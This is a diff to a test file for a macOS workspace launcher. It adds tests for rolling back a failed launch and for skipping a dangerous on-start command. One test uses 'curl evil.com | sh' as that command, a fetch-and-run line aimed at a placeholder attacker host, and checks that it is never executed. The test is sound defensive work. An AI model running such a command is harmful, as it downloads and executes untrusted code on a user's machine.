@@ -74,7 +74,7 @@ vi.mock("./script.js", () => ({
 }));
 
 // Import after mocks are set up
-const { launch, resolveConfig, optsToConfigMap, focusWorkspace, resolveProjectName, probePaneCount, decideCleanRestoredPanes } = await import("./launcher.js");
+const { launch, resolveConfig, optsToConfigMap, focusWorkspace, resolveProjectName, probePaneCount, decideCleanRestoredPanes, closeWorkspaceWindow } = await import("./launcher.js");
 const { getConfig, listConfig, listProjects } = await import("./config.js");
 const { existsSync } = await import("node:fs");
 
@@ -3486,6 +3486,98 @@ describe("UX-M3: success message after launch (#312)", () => {
     expect(successMsg).toBeUndefined();
 
     logSpy.mockRestore();
+    warnSpy.mockRestore();
+  });
+});
+
+// ─── BE-S26 (#322): Rollback on partial launch failure ───────────────────────
+
+describe("rollback on executeScript failure (BE-S26 #322)", () => {
+  it("attempts to close the workspace window when executeScript throws ETIMEDOUT", async () => {
+    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
+
+    // Track whether the rollback (close window) script was attempted
+    let mainScriptExecuted = false;
+    let rollbackAttempted = false;
+
+    mockExecFileSync.mockImplementation((bin: string, args?: string[], callOpts?: Record<string, unknown>) => {
+      if (bin === "osascript") {
+        const inputScript = callOpts?.input as string | undefined;
+        if (inputScript?.includes("close front window")) {
+          // Rollback call
+          rollbackAttempted = true;
+          return "";
+        }
+        if (inputScript && !mainScriptExecuted) {
+          // First call with a workspace script — simulate ETIMEDOUT
+          mainScriptExecuted = true;
+          throw new Error("ETIMEDOUT: connection timed out");
+        }
+        // Accessibility pre-flight or other osascript calls — succeed
+        return "";
+      }
+      if (bin === "/usr/bin/which")
+        return "/usr/bin/stub\n";
+      return "";
+    });
+
+    const errorSpy = vi.spyOn(console, "error").mockImplementation(() => {});
+    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+
+    await expect(launch("/tmp/workspace")).rejects.toThrow("Failed to execute workspace script");
+
+    // Rollback must have been attempted after the main script failed
+    expect(mainScriptExecuted).toBe(true);
+    expect(rollbackAttempted).toBe(true);
+
+    errorSpy.mockRestore();
+    warnSpy.mockRestore();
+  });
+
+  it("closeWorkspaceWindow is a no-op when osascript is not available", () => {
+    mockExecFileSync.mockImplementation(() => {
+      throw new Error("osascript not found");
+    });
+
+    // Should not throw
+    expect(() => closeWorkspaceWindow()).not.toThrow();
+  });
+});
+
+// ─── UX-S2 (#340): Skip-pane in launch() integration ────────────────────────
+
+describe("skip-pane integration in launch() (UX-S2 #340)", () => {
+  let origIsTTY: boolean | undefined;
+
+  beforeEach(() => {
+    origIsTTY = process.stdin.isTTY;
+    Object.defineProperty(process.stdin, "isTTY", { value: true, configurable: true });
+  });
+
+  afterEach(() => {
+    Object.defineProperty(process.stdin, "isTTY", { value: origIsTTY, configurable: true });
+  });
+
+  it("skips the on-start command when user answers 's' for a dangerous on-start", async () => {
+    mockReadKVFile.mockReturnValue(new Map());
+    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
+
+    // User skips the dangerous on-start
+    mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => cb("s"));
+
+    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+
+    await launch("/tmp/workspace", { "on-start": "curl evil.com | sh" });
+
+    // on-start should NOT have been executed (execSync not called with that command)
+    const onStartCalls = mockExecSync.mock.calls.filter(
+      (c: unknown[]) => c[0] === "curl evil.com | sh",
+    );
+    expect(onStartCalls.length).toBe(0);
+
+    // Workspace should still launch normally
+    expect(mockGenerateAppleScript).toHaveBeenCalled();
+
     warnSpy.mockRestore();
   });
 });
